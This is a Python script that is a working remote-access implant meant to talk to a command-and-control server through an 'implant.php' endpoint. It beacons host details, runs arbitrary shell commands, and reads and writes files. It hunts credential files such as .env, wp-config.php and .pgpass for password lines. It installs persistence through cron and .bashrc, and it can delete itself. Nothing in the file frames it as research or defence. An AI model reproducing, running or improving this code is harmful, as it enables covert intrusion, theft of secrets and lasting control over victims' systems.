#!/usr/bin/env python3
import json, os, sys, subprocess, base64, urllib.request, urllib.parse, shutil, glob, socket, struct, time, platform

AUTH_KEY = "sentinelx_2024"
C2_URL = ""
CWD = os.getcwd()

def req(data):
    if not C2_URL: return {"status": "error", "message": "No C2_URL"}
    if AUTH_KEY:
        req = urllib.request.Request(C2_URL + "/implant.php", urllib.parse.urlencode(data).encode())
        req.add_header("X-Auth", AUTH_KEY)
        try:
            res = urllib.request.urlopen(req, timeout=10)
            return json.loads(res.read())
        except: return {"status": "error", "message": "Connection failed"}
    return {"status": "error", "message": "No auth"}

def beacon():
    info = {
        "hostname": socket.gethostname(), "os": f"{platform.system()} {platform.release()}",
        "python": platform.python_version(), "user": os.environ.get("USER", os.environ.get("USERNAME", "?")),
        "cwd": os.getcwd(), "platform": platform.platform(), "arch": platform.machine(),
    }
    return {"status": "ok", "data": info}

def exec_cmd(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        out = r.stdout + r.stderr
        return {"status": "ok", "output": out, "cwd": os.getcwd()}
    except subprocess.TimeoutExpired:
        return {"status": "error", "message": "Timeout"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def file_list(path):
    items = []
    try:
        for e in os.listdir(path):
            fp = os.path.join(path, e)
            items.append({"name": e, "type": "dir" if os.path.isdir(fp) else "file", "size": os.path.getsize(fp) if os.path.isfile(fp) else 0})
    except: pass
    return {"status": "ok", "items": items, "path": os.path.realpath(path)}

def file_read(path):
    try:
        with open(path, "rb") as f: return {"status": "ok", "content": base64.b64encode(f.read()).decode()}
    except Exception as e: return {"status": "error", "message": str(e)}

def file_write(path, content):
    try:
        with open(path, "wb") as f: f.write(base64.b64decode(content))
        return {"status": "ok", "message": "Written"}
    except Exception as e: return {"status": "error", "message": str(e)}

def file_search(root, pattern, max_results=100):
    results = []
    import fnmatch
    for dirpath, _, files in os.walk(root):
        for f in files:
            if fnmatch.fnmatch(f, pattern):
                fp = os.path.join(dirpath, f)
                results.append({"name": f, "path": fp, "size": os.path.getsize(fp)})
                if len(results) >= max_results: break
        if len(results) >= max_results: break
    return {"status": "ok", "results": results, "count": len(results)}

def password_hunt():
    hits = []
    targets = [".env", "config.php", "wp-config.php", ".htpasswd", ".my.cnf", ".pgpass"]
    roots = [os.getcwd(), "/var/www/html", "/etc", os.path.expanduser("~")]
    for root in roots:
        if not os.path.isdir(root): continue
        for t in targets:
            fp = os.path.join(root, t)
            if os.path.isfile(fp):
                try:
                    with open(fp, "r", errors="ignore") as f: content = f.read()
                    for i, line in enumerate(content.split("\n"), 1):
                        if any(w in line.lower() for w in ["password", "pass", "secret", "key", "db_pass"]):
                            hits.append({"file": fp, "line": i, "match": line.strip()[:200]})
                except: pass
    return {"status": "ok", "hits": hits, "count": len(hits)}

def persistence(method):
    results = []
    if method in ("cron", "all"):
        crontab = f"* * * * * cd {CWD} && python3 {__file__} >/dev/null 2>&1\n"
        subprocess.run(f'(crontab -l 2>/dev/null; echo "{crontab}") | crontab -', shell=True)
        results.append({"method": "cron", "status": "installed"})
    if method in ("bashrc", "all"):
        rc = os.path.expanduser("~/.bashrc")
        with open(rc, "a") as f: f.write(f"\npython3 {__file__} >/dev/null 2>&1 &\n")
        results.append({"method": "bashrc", "status": "installed"})
    return {"status": "ok", "results": results}

def self_destruct():
    try: os.remove(__file__)
    except: pass
    return {"status": "ok"}

action = sys.argv[1] if len(sys.argv) > 1 else "beacon"
result = {"status": "error", "message": "Unknown action"}

if action == "beacon": result = beacon()
elif action == "exec": result = exec_cmd(" ".join(sys.argv[2:]) if len(sys.argv) > 2 else "")
elif action == "file_list": result = file_list(sys.argv[2] if len(sys.argv) > 2 else "/")
elif action == "file_read": result = file_read(sys.argv[2] if len(sys.argv) > 2 else "")
elif action == "file_write": result = file_write(sys.argv[2] if len(sys.argv) > 3 else "", sys.argv[3] if len(sys.argv) > 3 else "")
elif action == "file_search": result = file_search(sys.argv[2] if len(sys.argv) > 2 else "/", sys.argv[3] if len(sys.argv) > 3 else "*")
elif action == "password_hunt": result = password_hunt()
elif action == "persistence": result = persistence(sys.argv[2] if len(sys.argv) > 2 else "all")
elif action == "self_destruct": result = self_destruct()

print(json.dumps(result))
